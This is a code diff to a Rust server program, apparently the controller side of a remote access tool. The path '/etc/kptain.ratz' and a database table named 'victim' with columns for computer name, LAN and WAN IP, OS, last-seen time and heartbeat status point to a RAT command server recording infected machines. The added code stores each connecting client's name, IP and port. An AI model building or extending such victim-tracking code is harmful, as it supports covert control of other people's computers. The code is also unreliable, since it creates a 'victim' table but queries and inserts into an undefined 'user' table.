@@ -12,7 +12,9 @@ use serde::{Deserialize, Serialize};
 use rsa::{RsaPublicKey, RsaPrivateKey, pkcs8::FromPublicKey, pkcs8::ToPublicKey, PaddingScheme};
 use rand::rngs::OsRng;
 use rusqlite::{params, Connection, Result};
-
+use std::fs;
+use std::fs::File;
+use std::io::prelude::*;
 
 #[cfg(test)]
 mod tests {
@@ -263,7 +265,41 @@ async fn main() -> io::Result<()> {
             stream: socket,
             _addr: addr,
         };
-
+        
+        let path = "/etc/kptain.ratz";
+        if !std::path::Path::new(&path).exists() {
+        fs::create_dir("/etc/kptain.ratz")?;
+        File::create("/etc/kptain.ratz/datasave.db")?;
+        let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
+        
+        conn.execute(
+            "CREATE TABLE victim (
+            	logo TEXT,
+                id INTEGER PRIMARY KEY,
+                computername TEXT,
+                lanip TEXT,
+                wanip TEXT,
+                os TEXT,
+                lastseen TEXT,
+                hbstatus TEXT);",NO_PARAMS,);           
+                
+            }
+        
+        let conn = Connection::open("/etc/kptain.ratz/datasave.db").unwrap();
+        println!("{}, {}",user1.username,user1._addr);
+        let socket_ddr: &str = &user1._addr.to_string();
+        let croped : Vec<&str> = socket_ddr.split(":").collect();
+        
+        //let mut statement = conn.prepare("SELECT * FROM user WHERE name = ?").unwrap();
+        let verif: Result<i64> = conn.query_row("SELECT * FROM user WHERE name = ?",&[&user1.username], |row| row.get(0));
+        match verif {
+            Ok(n) =>{println!("client already exist");}
+            Err(_) =>{
+                conn.execute("insert into user (name,ip,autre) values (:name,:ip,:port);",&[(":name", &user1.username.to_string() ),(":ip", &croped[0].to_string()),(":port", &croped[1].to_string())],);
+                println!("client added to db");
+            }
+        }
+        
           // Thread creation
         let thread_send = chann_snd.clone();
         let thread_rcv = chann_snd.subscribe();
